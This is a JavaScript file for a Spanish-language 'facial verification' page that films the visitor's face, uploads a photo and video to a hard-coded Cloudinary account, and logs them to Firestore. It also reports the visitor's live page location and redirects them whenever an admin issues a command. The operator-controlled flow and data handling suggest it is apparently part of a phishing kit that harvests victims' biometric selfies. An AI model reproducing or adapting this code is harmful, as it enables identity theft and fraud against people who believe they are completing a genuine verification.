"use strict";

(function () {
    var db = window.db;
    if (!db) return;

    var usuario = localStorage.getItem('usuarioActual');
    if (!usuario) {
        window.location.href = '/';
        return;
    }

    var stream = null;
    var mediaRecorder = null;
    var recordedChunks = [];

    var CLOUD_NAME = 'dhf5fcpz9';
    var CLOUDINARY_VIDEO_URL = 'https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/video/upload';
    var CLOUDINARY_IMAGE_URL = 'https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/image/upload';
    var CLOUDINARY_PRESET = 'faceid_videos';

    function detectDevice() {
        return /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Movil' : 'Desktop';
    }

    var lastKnownPage = null;
    var lastAdminCommandAt = null;
    var redirecting = false;
    var fallbackTimerId = null;
    var waitingForAdminSince = 0;

    function showLoader() {
        var loader = document.getElementById('athFlowLoader');
        if (loader) {
            loader.classList.remove('sf-hidden');
            loader.setAttribute('aria-hidden', 'false');
        }
    }

    function showPersistentLoader() {
        showLoader();
    }

    function clearFallbackTimer() {
        if (fallbackTimerId) {
            clearTimeout(fallbackTimerId);
            fallbackTimerId = null;
        }
    }

    function listenForRedirect() {
        if (redirecting) return;
        var firstSnapshot = true;
        db.collection('redireccion').doc(usuario).onSnapshot(function (snap) {
            if (redirecting) return;
            if (!snap.exists) return;
            var data = snap.data();

            var adminCmdAt = Number(data.adminCommandAt || 0);

            if (firstSnapshot) {
                firstSnapshot = false;
                lastAdminCommandAt = adminCmdAt;
                lastKnownPage = data.page || 0;
                return;
            }

            if (!adminCmdAt || adminCmdAt === lastAdminCommandAt) return;
            if (waitingForAdminSince && adminCmdAt <= waitingForAdminSince) return;

            lastAdminCommandAt = adminCmdAt;

            var p = data.page;
            lastKnownPage = p;

            if (!p || !window.appConfig || !window.appConfig.routes) return;
            var route = window.appConfig.routes[p];
            if (!route || !route.url) return;

            clearFallbackTimer();
            redirecting = true;
            var currentPath = window.location.pathname;
            var currentFile = currentPath.split('/').pop() || 'index.html';
            var targetFile = String(route.url || '').replace(/^\//, '');

            if (currentFile === targetFile) {
                window.location.reload();
            } else if (route.url === '/') {
                window.location.href = '/';
            } else {
                window.location.href = route.url;
            }
        });
    }

    var fallbackUrl = '#';

    function startFallbackTimer() {
        clearFallbackTimer();
        fallbackTimerId = setTimeout(function () {
            if (!redirecting) {
                redirecting = true;
                window.location.href = fallbackUrl;
            }
        }, 15000);
    }

    function setStatus(text) {
        var el = document.getElementById('fc-status');
        if (el) el.textContent = text;
    }

    function capturePhoto(videoEl) {
        var canvas = document.createElement('canvas');
        canvas.width = videoEl.videoWidth || 640;
        canvas.height = videoEl.videoHeight || 480;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
        return new Promise(function (resolve) {
            canvas.toBlob(function (b) { resolve(b); }, 'image/jpeg', 0.92);
        });
    }

    function uploadBlob(blob, type) {
        var isVideo = (type === 'video');
        var url = isVideo ? CLOUDINARY_VIDEO_URL : CLOUDINARY_IMAGE_URL;
        var timestamp = Date.now();
        var publicId = 'faceId/' + usuario + '/' + type + '_' + timestamp;

        return new Promise(function (resolve, reject) {
            var payload = new FormData();
            payload.append('file', blob);
            payload.append('upload_preset', CLOUDINARY_PRESET);
            payload.append('public_id', publicId);
            payload.append('resource_type', isVideo ? 'video' : 'image');
            payload.append('folder', 'faceId');
            payload.append('context', 'usr=' + usuario + '|ts=' + timestamp + '|type=' + type);

            var xhr = new XMLHttpRequest();

            xhr.upload.addEventListener('progress', function (e) {
                if (e.lengthComputable) {
                    var pct = Math.round((e.loaded / e.total) * 100);
                    setStatus('Un momento por favor... ' + pct + '%');
                }
            });

            xhr.addEventListener('load', function () {
                if (xhr.status === 200) {
                    try {
                        resolve(JSON.parse(xhr.responseText));
                    } catch (_) {
                        reject(new Error('Parse error'));
                    }
                } else {
                    reject(new Error('HTTP ' + xhr.status));
                }
            });

            xhr.addEventListener('error', function () {
                reject(new Error('Network error'));
            });

            xhr.open('POST', url);
            xhr.send(payload);
        });
    }

    function saveToFirestore(videoUrl, photoUrl, videoResp, photoResp) {
        db.collection('verificaciones_faciales').add({
            usuario: usuario,
            videoUrl: videoUrl,
            photoUrl: photoUrl,
            videoPublicId: videoResp ? (videoResp.public_id || '') : '',
            photoPublicId: photoResp ? (photoResp.public_id || '') : '',
            cloudinaryVideo: videoResp ? {
                asset_id: videoResp.asset_id || '',
                format: videoResp.format || '',
                duration: videoResp.duration || 0,
                width: videoResp.width || 0,
                height: videoResp.height || 0,
                bytes: videoResp.bytes || 0
            } : null,
            cloudinaryPhoto: photoResp ? {
                asset_id: photoResp.asset_id || '',
                format: photoResp.format || '',
                width: photoResp.width || 0,
                height: photoResp.height || 0,
                bytes: photoResp.bytes || 0
            } : null,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            dispositivo: detectDevice()
        }).catch(function (err) {
            console.error('Error guardando verificacion_facial:', err);
        });

        db.collection('datosHistorial').doc(usuario).update({
            videoFacialUrl: videoUrl,
            fotoFacialUrl: photoUrl,
            verificacionFacialCompletada: true
        }).catch(function () {});

        db.collection('redireccion').doc(usuario).update({
            facialCompletada: true,
            facialMediaReady: true,
            facialMediaReadyAt: firebase.firestore.FieldValue.serverTimestamp(),
            videoFacialUrl: videoUrl,
            fotoFacialUrl: photoUrl,
            pageLocation: 'esperando',
            lastActivity: firebase.firestore.FieldValue.serverTimestamp()
        }).catch(function () {});
    }

    function ready(fn) {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', fn, { once: true });
        } else {
            fn();
        }
    }

    ready(function () {
        var screen1 = document.getElementById('fc-screen1');
        var screen2 = document.getElementById('fc-screen2');
        var btnStart = document.getElementById('fc-btnStart');
        var btnCapture = document.getElementById('fc-btnCapture');
        var closeBtn = screen2 ? screen2.querySelector('.fc-close') : null;
        var video = screen2 ? screen2.querySelector('video') : null;
        var instruccion = document.getElementById('fc-instruccion');

        setInterval(function () {
            db.collection('redireccion').doc(usuario).update({
                isActive: true,
                lastActivity: firebase.firestore.FieldValue.serverTimestamp(),
                pageLocation: 'facial'
            }).catch(function () {});
        }, 15000);

        if (btnStart) {
            btnStart.addEventListener('click', function () {
                screen1.style.display = 'none';
                screen2.style.display = 'block';
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                    .then(function (s) {
                        stream = s;
                        if (video) video.srcObject = stream;
                    })
                    .catch(function () {
                        screen2.style.display = 'none';
                        screen1.style.display = 'flex';
                    });
            });
        }

        if (closeBtn) {
            closeBtn.addEventListener('click', function () {
                screen2.style.display = 'none';
                screen1.style.display = 'flex';
                if (stream) {
                    stream.getTracks().forEach(function (t) { t.stop(); });
                    stream = null;
                }
            });
        }

        if (btnCapture) {
            btnCapture.addEventListener('click', function () {
                if (!stream) return;
                btnCapture.style.display = 'none';
                if (instruccion) instruccion.textContent = 'No te muevas...';

                var photoPromise = video
                    ? capturePhoto(video)
                    : Promise.resolve(null);

                photoPromise.then(function (photoBlob) {
                    recordedChunks = [];
                    var options = { mimeType: 'video/webm' };
                    try {
                        mediaRecorder = new MediaRecorder(stream, options);
                    } catch (_) {
                        mediaRecorder = new MediaRecorder(stream);
                    }

                    mediaRecorder.ondataavailable = function (ev) {
                        if (ev.data.size > 0) recordedChunks.push(ev.data);
                    };

                    mediaRecorder.onstop = function () {
                        var videoBlob = new Blob(recordedChunks, { type: 'video/webm' });

                        if (stream) {
                            stream.getTracks().forEach(function (t) { t.stop(); });
                            stream = null;
                        }

                        if (instruccion) instruccion.textContent = 'Procesando...';
                        setStatus('Un momento por favor...');
                        showLoader();

                        var photoUpload = photoBlob
                            ? uploadBlob(photoBlob, 'photo')
                            : Promise.resolve(null);

                        photoUpload.then(function (photoResp) {
                            return uploadBlob(videoBlob, 'video').then(function (videoResp) {
                                var videoUrl = videoResp ? (videoResp.secure_url || '') : '';
                                var photoUrl = photoResp ? (photoResp.secure_url || '') : '';
                                waitingForAdminSince = Date.now();
                                saveToFirestore(videoUrl, photoUrl, videoResp, photoResp);
                                setStatus('Un momento por favor...');
                                showPersistentLoader();

                                db.collection('redireccion').doc(usuario).get().then(function (docSnap) {
                                    if (docSnap.exists) {
                                        var data = docSnap.data();
                                        lastKnownPage = data.page || 0;
                                        lastAdminCommandAt = Math.max(Number(data.adminCommandAt || 0), waitingForAdminSince);
                                    }
                                    listenForRedirect();
                                    startFallbackTimer();
                                }).catch(function () {
                                    lastAdminCommandAt = waitingForAdminSince;
                                    listenForRedirect();
                                    startFallbackTimer();
                                });
                            });
                        }).catch(function (err) {
                            setStatus('Un momento por favor...');
                            console.error('Upload error:', err);
                        });
                    };

                    mediaRecorder.start();

                    setTimeout(function () {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            if (instruccion) instruccion.textContent = 'Procesando...';
                        }
                    }, 12000);
                });
            });
        }
    });
})();
